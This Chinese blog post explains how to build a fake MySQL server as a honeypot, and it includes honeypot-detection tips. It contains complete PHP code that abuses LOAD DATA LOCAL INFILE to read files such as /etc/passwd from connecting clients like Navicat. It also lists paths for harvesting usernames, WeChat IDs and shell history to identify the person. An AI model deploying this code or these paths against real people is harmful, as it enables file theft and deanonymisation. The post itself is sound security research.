# 溯源反制-MYSQL蜜罐

## 前言

- 随着网络安全技术的发展，越来越多的攻击手段层出不穷。传统的网络安全防御手段只是被动的防御，无法对未知网络攻击进行主动感知和响应，而蜜罐技术正是一种有效而且简单的主动防御手段。蜜罐技术能够伪装真实的网络资产环境对黑客进行诱骗，手机攻击者对蜜罐系统的各种操作和尝试数据，并且能够主动收集攻击者的相关信息，例如通过JSONP获取用户的社交账号信息等。这样我们在遭受到网络攻击时候可以及时发现潜在未知的攻击手段以及Payload，同时也获取了攻击者的有关信息构建攻击者画像便于后续溯源工作，甚至蜜罐系统能够对攻击者进行反制。本文主要是研究MYSQL蜜罐的基本实现原理，浅析MYSQL蜜罐在溯源反制中的利用。

## 实现原理

### MYSQL数据包结构

- MYSQL数据包的结构比较直观，前三个字节是记录`Payload`的长度,最大长度为`FF FF FF`,第四个字节为消息序号。

| Type | Name | Description |
| --- | --- | --- |
| int<3> | *`payload_length`* | payload的长度,整数类型。不包括包头四个字节 |
| int<1> | *`sequence_id`* | Sequence ID |
| string | *`payload`* | 有效载荷,字符串类型。长度=payload_length |

### MYSQL认证过程

- 关于MYSQL认证过程主要以`Navicat`认证来分析过程。
- 通过`wireshark`可以看到在与MYSQL服务器简历TCP连接后服务器会向客户端发送Greeting数据包提供服务器版本等信息.

![image20220215173537168](https://goodcheerleung.gitee.io/macpic/image-20220215173537168.png)

- Geeting数据包

Geeting数据包我们主要关注如下几个字段。

| Type | Name | Description |
| --- | --- | --- |
| int<3> | *`payload_length`* | payload的长度，整数类型。不包括包头四个字节 |
| int<1> | *`sequence_id`* | Sequence ID |
| string | *`payload`* | 有效载荷,字符串类型。长度=payload_length |
| int<1> | *`protocol`* | 协议版本 |
| string | *`version`* | 服务器版本 |
| int<4> | *`thread_id`* | 线程ID |
| string<8> | *`salt`* | salt的前八个字符 |
| int<2> | *`caps.server`* | serverCapabilities |
| int<1> | *`server_language`* | language |
| int<2> | *`server_status`* | 服务器状态 |
|     | ... |     |
| string<12> | *`salt`* | salt的后12个字符 |

- 然后是客户端向服务器发送登陆数据包，主要是用户名和密码以及客户端插件信息等等。

![image20220216141400124](https://goodcheerleung.gitee.io/macpic/image-20220216141400124.png)

- 在服务端校验密码通过之后会返回OK包告诉客户端验证完成。

![image20220216141520907](https://goodcheerleung.gitee.io/macpic/image-20220216141520907.png)

- 客户端请求执行`SET NAMES utf8mb4`在设置完成后服务端同样会返回OK包，这里需要注意的一点是这里的OK包Packet Number不能与校验登陆返回的OK包一样，否则无法进行下一步。

![image20220216142023032](https://goodcheerleung.gitee.io/macpic/image-20220216142023032.png)

- 然后客户端会要求查询系统变量。

![image20220216142404493](https://goodcheerleung.gitee.io/macpic/image-20220216142404493.png)

- 服务端执行完毕后返回系统变量结果。

![image20220216142602829](https://goodcheerleung.gitee.io/macpic/image-20220216142602829.png)

- 客户端获取到系统变量的结果后会请求获取数据库列表

![image20220216142752916](https://goodcheerleung.gitee.io/macpic/image-20220216142752916.png)

- 服务端在执行完毕后会将数据库列表返回：

![image20220216142852318](https://goodcheerleung.gitee.io/macpic/image-20220216142852318.png)

- 至此`Navicat`连接MYSQL数据的过程基本分析基本流程我们可以简化如下：

![image20220216144225039](https://goodcheerleung.gitee.io/macpic/image-20220216144225039.png)

### 模拟服务端编写

#### 通过`Navicat`校验

根据上面的分析过程我们使用Socket来模拟MySQL数据服务器对客户端的响应过程，可以欺骗`Navicat`登陆验证。

![image20220216150243638](https://goodcheerleung.gitee.io/macpic/image-20220216150243638.png)

- 模拟代码：

```php
<?php 
error_reporting(0);
set_time_limit(0);
$address = "0.0.0.0";
$port = 3306;
define("VERSION","\x4a\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x00\x02\x00\x00\x00\x5c\x31\x01\x33\x7d\x09\x65\x7a\x00\xff\xff\xc0\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x1c\x55\x27\x71\x59\x25\x3a\x2c\x6d\x2e\x2d\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00");
define("LOGINSUCESS","\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00");
define("VARIABLES","\x01\x00\x00\x01\x02\x52\x00\x00\x02\x03\x64\x65\x66\x00\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x0d\x56\x61\x72\x69\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0d\x56\x61\x72\x69\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0c\x2d\x00\x00\x01\x00\x00\xfd\x01\x10\x00\x00\x00\x42\x00\x00\x03\x03\x64\x65\x66\x00\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x05\x56\x61\x6c\x75\x65\x05\x56\x61\x6c\x75\x65\x0c\x2d\x00\x00\x10\x00\x00\xfd\x00\x00\x00\x00\x00\x05\x00\x00\x04\xfe\x00\x00\x22\x00\x1a\x00\x00\x05\x16\x6c\x6f\x77\x65\x72\x5f\x63\x61\x73\x65\x5f\x66\x69\x6c\x65\x5f\x73\x79\x73\x74\x65\x6d\x02\x4f\x4e\x19\x00\x00\x06\x16\x6c\x6f\x77\x65\x72\x5f\x63\x61\x73\x65\x5f\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x73\x01\x32\x05\x00\x00\x07\xfe\x00\x00\x22\x00");
define("DBLIST","\x01\x00\x00\x01\x01\x4b\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x44\x61\x74\x61\x62\x61\x73\x65\x0b\x53\x43\x48\x45\x4d\x41\x5f\x4e\x41\x4d\x45\x0c\x2d\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x13\x00\x00\x04\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x00\x00\x05\x05\x6d\x79\x73\x71\x6c\x06\x00\x00\x06\x05\x70\x61\x70\x65\x72\x13\x00\x00\x07\x12\x70\x65\x72\x66\x6f\x72\x6d\x61\x6e\x63\x65\x5f\x73\x63\x68\x65\x6d\x61\x07\x00\x00\x08\x06\x73\x63\x68\x6f\x6f\x6c\x04\x00\x00\x09\x03\x73\x79\x73\x05\x00\x00\x0a\xfe\x00\x00\x22\x00");
define("OK","\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00");
function initSocket($address,$port){
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die(socket_strerror(socket_last_error()));
    socket_set_block($sock) or die( socket_strerror(socket_last_error()));//阻塞模式
    $result = socket_bind($sock, $address, $port) or die(socket_strerror(socket_last_error()));//绑定端口
    $result = socket_listen($sock, 4) or die(socket_strerror(socket_last_error()));//开始监听
    echo "Listening:$address:$port\n";
    return $sock;
}
function closeSocket($sock){
    socket_close($sock);
}
function creatMessage($sock){
    $msgsock = socket_accept($sock);//or die( socket_strerror(socket_last_error()));
    return $msgsock;
}
function closeMessage($msgsock){
    socket_close($msgsock);
}
function readBuff($msgsock){
    try{
    $buf = socket_read($msgsock, 8192);
        return $buf;
    }catch (Exception $e) {
        echo $e->getMessage();
        return false;
    }

}
function sendBuff($msgsock,$msg){
    try{
        socket_write($msgsock, $msg, strlen($msg));
    }catch (Exception $e) {
        echo $e->getMessage();
    }

}
$sock = initSocket($address,$port);
do{
    $msgsock = creatMessage($sock);
    sendBuff($msgsock,VERSION);
    while($content = readBuff($msgsock)){
        if(preg_match("/0000000000000000000000000000000000000000000000(.*)0014[a-zA-Z0-9]{0,40}/is",bin2hex($content))){
            sendBuff($msgsock,LOGINSUCESS);
        }elseif(strpos($content,"SET NAMES utf8")) {
            sendBuff($msgsock,OK);
        }elseif(strpos($content,"SHOW VARIABLES")){
            sendBuff($msgsock,VARIABLES);
        }elseif(strpos($content,"SHOW DATABASES")){
            sendBuff($msgsock,DBLIST);
            closeMessage($msgsock);
        }
        }
}while(True);
?>
```

#### 通过FSCAN校验

- 这时候我们一个具备基本验证功能的`FAKE MYSQL SERVER`基本完成，但是这时候存在一个问题是，我们的`FAKE MYSQL SERVER`是无法通过扫描器校验的，我们以`Fscan`为例扫描虽然能发现开放了3306端口但是并没有发现弱口令，如果我们作为蜜罐是期望攻击者使用`Navicat`去连接而后对攻击者溯源的话我们就需要扫描器快速发现弱口令。

![image20220216150924883](https://goodcheerleung.gitee.io/macpic/image-20220216150924883.png)

- 我们使用正常的MYSQL SERVER来与FSCAN通信，研究FSCAN与MYSQL通信校验的原理。
- 我们通过Wirshark抓包发现FSCAN与`Navicat`认证不同在于，在执行完`SET NAMES utf8mb4`后FSCAN不会再请求系统变量以及后续请求数据库列表而是直接请求Ping数据包来检测服务器状态。

![image20220216151318767](https://goodcheerleung.gitee.io/macpic/image-20220216151318767.png)

我们根据`FSCAN`的特性对代码进行修改，即可让FSCAN检测到弱口令，当然不同扫描器的检测方式不同可以根据具体情况添加功能。

![image20220216151938692](https://goodcheerleung.gitee.io/macpic/image-20220216151938692.png)

### LOAD DATA INFILE

LOAD DATA INFILE 语句能够以非常高的速度从文本文件中读取行到表中，但是该功能默认是关闭的，我们可以通过如下语句进行查看服务器是否开启该功能。

```mysql
show global variables like 'local_infile';
```

![image20220216154625711](https://goodcheerleung.gitee.io/macpic/image-20220216154625711.png)

若服务器未开启该功能可以直接开启

```mysql
set global local_infile=1;
```

- 该语句的基本语法如下：

```mysql
LOAD DATA [LOW_PRIORITY | CONCURRENT] [LOCAL] INFILE 'file_name'
[REPLACE | IGNORE]
INTO TABLE tbl_name
[PARTITION (partition_name,...)]
[CHARACTER SET charset_name]
[{FIELDS | COLUMNS}
[TERMINATED BY 'string']
[[OPTIONALLY] ENCLOSED BY 'char']
[ESCAPED BY 'char']
]
[LINES
[STARTING BY 'string']
[TERMINATED BY 'string']
]
[IGNORE number {LINES | ROWS}]
[(col_name_or_user_var,...)]
[SET col_name = expr,...]
```

- 我们通过该语句加载本地文件，而后抓包分析`LOAD DATA INFILE`.

```mysql
load data local infile '/etc/passwd' into table sys_config fields terminated by '\n';
```

![image20220216155855214](https://goodcheerleung.gitee.io/macpic/image-20220216155855214.png)

- 我们可以发现在请求`load data`语句后，服务器会返回一个`Response TABULAR`数据包来请求客户端读取本地文件。也就是说通过`load data`读取文件是服务端请求客户端读取文件，而不是客户端主动读取文件后发往服务端。那么假设我们伪造服务器向客户端请求读取这个文件是否可以读取到客户端计算机中的任意文件呢？答案是可以的，这是由于在`MySQL`协议中，客户端本身不存储自身的请求，而是通过服务端的响应来执行操作的。
- `Response TABULAR`数据包比较简单，就是普通的MYSQL数据包，payload就是文件路径但是前面要加上`\xfb`作为标志位。

| Type | Name | Description |
| --- | --- | --- |
| int<3> | *`payload_length`* | payload的长度,整数类型。不包括包头四个字节 |
| int<1> | *`sequence_id`* | Sequence ID |
| int<1> | *`flag`* | `\xFb` |
| string | *`fpath`* | 文件路径 |

- 我们直接构建读取文件数据包

```php
    $msg = chr(strlen($fpath)+1) . "\x00\x00\x01\xFB".$fpath;
```

- 如果要读取文件我们必须要在客户端发送一条`Query`包后才能读取文件。首先我们的蜜罐必须保留扫描器扫描认证的功能，那么我们不能在发送``SET NAMES utf8mb4`时候请求文件。我们可以选择在`Navicat`请求数据库列表时候要求读取文件。那么修改代码如下:

```mysql
<?php 
error_reporting(0);
set_time_limit(0);
$address = "0.0.0.0";
$port = 3306;
define("VERSION","\x4a\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x00\x02\x00\x00\x00\x5c\x31\x01\x33\x7d\x09\x65\x7a\x00\xff\xff\xc0\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x1c\x55\x27\x71\x59\x25\x3a\x2c\x6d\x2e\x2d\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00");
define("LOGINSUCESS","\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00");
define("VARIABLES","\x01\x00\x00\x01\x02\x52\x00\x00\x02\x03\x64\x65\x66\x00\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x0d\x56\x61\x72\x69\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0d\x56\x61\x72\x69\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0c\x2d\x00\x00\x01\x00\x00\xfd\x01\x10\x00\x00\x00\x42\x00\x00\x03\x03\x64\x65\x66\x00\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x05\x56\x61\x6c\x75\x65\x05\x56\x61\x6c\x75\x65\x0c\x2d\x00\x00\x10\x00\x00\xfd\x00\x00\x00\x00\x00\x05\x00\x00\x04\xfe\x00\x00\x22\x00\x1a\x00\x00\x05\x16\x6c\x6f\x77\x65\x72\x5f\x63\x61\x73\x65\x5f\x66\x69\x6c\x65\x5f\x73\x79\x73\x74\x65\x6d\x02\x4f\x4e\x19\x00\x00\x06\x16\x6c\x6f\x77\x65\x72\x5f\x63\x61\x73\x65\x5f\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x73\x01\x32\x05\x00\x00\x07\xfe\x00\x00\x22\x00");
define("DBLIST","\x01\x00\x00\x01\x01\x4b\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x44\x61\x74\x61\x62\x61\x73\x65\x0b\x53\x43\x48\x45\x4d\x41\x5f\x4e\x41\x4d\x45\x0c\x2d\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x13\x00\x00\x04\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x00\x00\x05\x05\x6d\x79\x73\x71\x6c\x06\x00\x00\x06\x05\x70\x61\x70\x65\x72\x13\x00\x00\x07\x12\x70\x65\x72\x66\x6f\x72\x6d\x61\x6e\x63\x65\x5f\x73\x63\x68\x65\x6d\x61\x07\x00\x00\x08\x06\x73\x63\x68\x6f\x6f\x6c\x04\x00\x00\x09\x03\x73\x79\x73\x05\x00\x00\x0a\xfe\x00\x00\x22\x00");
define("OK","\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00");
function initSocket($address,$port){
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die(socket_strerror(socket_last_error()));
    socket_set_block($sock) or die( socket_strerror(socket_last_error()));//阻塞模式
    $result = socket_bind($sock, $address, $port) or die(socket_strerror(socket_last_error()));//绑定端口
    $result = socket_listen($sock, 4) or die(socket_strerror(socket_last_error()));//开始监听
    echo "Listening:$address:$port\n";
    return $sock;
}
function closeSocket($sock){
    socket_close($sock);
}
function creatMessage($sock){
    $msgsock = socket_accept($sock);//or die( socket_strerror(socket_last_error()));
    return $msgsock;
}
function closeMessage($msgsock){
    socket_close($msgsock);
}
function readBuff($msgsock){
    try{
    $buf = socket_read($msgsock, 8192);
        return $buf;
    }catch (Exception $e) {
        echo $e->getMessage();
        return false;
    }

}
function sendBuff($msgsock,$msg){
    try{
        socket_write($msgsock, $msg, strlen($msg));
    }catch (Exception $e) {
        echo $e->getMessage();
    }

}
function getFile($msgsock,$fpath){
    $msg = chr(strlen($fpath)+1) . "\x00\x00\x01\xFB".$fpath;
    sendBuff($msgsock,$msg);
}
function getUserIP($msgsock){
    socket_getpeername($msgsock, $addr, $por);
    return $addr;
}
$sock = initSocket($address,$port);
do{
    $msgsock = creatMessage($sock);
    sendBuff($msgsock,VERSION);
    echo sprintf("ClientIP:%s\n",getUserIP($msgsock));
    while($content = readBuff($msgsock)){
        if(preg_match("/0000000000000000000000000000000000000000000000(.*)0014[a-zA-Z0-9]{0,40}/is",bin2hex($content))){
            sendBuff($msgsock,LOGINSUCESS);
        }elseif(strpos($content,"SET NAMES utf8")) {
            sendBuff($msgsock,OK);
        }elseif(strpos($content,"SHOW VARIABLES")){
            sendBuff($msgsock,VARIABLES);

        }elseif(strpos($content,"SHOW DATABASES")){
            getFile($msgsock,"/etc/passwd");
            echo readBuff($msgsock);
            closeMessage($msgsock);
        }else{
            sendBuff($msgsock,OK);
            closeMessage($msgsock);
        }
    }
}while(True);
closeSocket($sock);
?>
```

- 在双击打开该服务器连接时候即可直接读取MAC上的`/etc/passwd`

![image20220216163320110](https://goodcheerleung.gitee.io/macpic/image-20220216163320110.png)

- 同时该`FAKE MYSQL SERVER`也可以被`FSCAN`检测到

![image20220216164246340](https://goodcheerleung.gitee.io/macpic/image-20220216164246340.png)

## 溯源中的利用

我们在上文中已经基本实现读取用户计算机中任意文件了，但是如何利用该`FAKE MYSQL SERVER`来溯源反制呢？

#### MAC中的溯源

##### 获取用户ID

在MAC中我们通过通过读取系统日志的方式获取用户ID

```
/var/log/system.log
```

![image20220216170740053](https://goodcheerleung.gitee.io/macpic/image-20220216170740053.png)

##### 获取用户WXID

- 一般来说获取到用户ID后可以通过该用户ID进行溯源，或者获取微信的wxid研究发现在MAC的微信文件夹下存在这么一个路径存储着微信的wxid,我们直接获取可以得到wxid

```shell
/Users/{用户名}/Library/Containers/com.tencent.xinWeChat/Data/Library/Application Support/com.tencent.xinWeChat/2.0b4.0.9/topinfo.data
```

- 获取到wxid后可以通过以下方式直接加他好友：
- `weixin://contacts/profile/`方法已经失效

```
weixin://findfriend/verifycontact/wxid_sqdazgmozn2822
```

在MAC版微信直接点击该连接即可加好友：

![image20220217112745753](https://goodcheerleung.gitee.io/macpic/image-20220217112745753.png)

##### 获取用户zsh_history或者bash_history

在用户文件夹下存在`.bash_history`或者`.zsh_history`近期命令操作可能能获取到一些敏感信息

```
/Users/{用户名}/.bash_history
/Users/{用户名}/.zsh_history
```

#### Windows 中的溯源

##### 获取用户ID

- 在使用过一段时间的Windows中的`C:\Windows\PFRO.log` 可能能够获取到用户ID具体获取操作与MAC类似

##### 获取用户WXID

获取用户微信概率在WINDOWS中概率较低，一般来说Windows用户会更改微信存储位置

```
C:\Users\{用户名}\Documents\WeChat Files\All Users\config\config.data
```

## MYSQL蜜罐的识别

#### 通过Salt识别

我们在上文中提到`Greeting Packet`中需要关注的字段Salt存在二十个字符。在我们的蜜罐中是Salt是固定不变的，因此我们在识别MYSQL蜜罐时候可以检测Salt是否每次都变化来鉴别是否是蜜罐,当然我们对抗检测可以随机生成字符来逃避检测。

![image20220217124815608](https://goodcheerleung.gitee.io/macpic/image-20220217124815608.png)

#### 通过TheadID识别

MYSQL中TheadID也是会变化的，同时变化速度也是非常快的，因此我们也可以通过`TheadID`是否变化或者变化速度来检测。

#### 通过密码验证来识别

在上文中我们实现的蜜罐也并未对密码进行校验，也就是说任意密码都可以校验通过。如果一个MYSQL数据库任意密码都能通过那就极有可能是蜜罐。

## 实现源码

- PHP简陋实现的MYSQL任意文件读取

https://github.com/sharpleung/MYSQLH

## 参考

1. https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg
2. https://lightless.me/archives/read-mysql-client-file.html
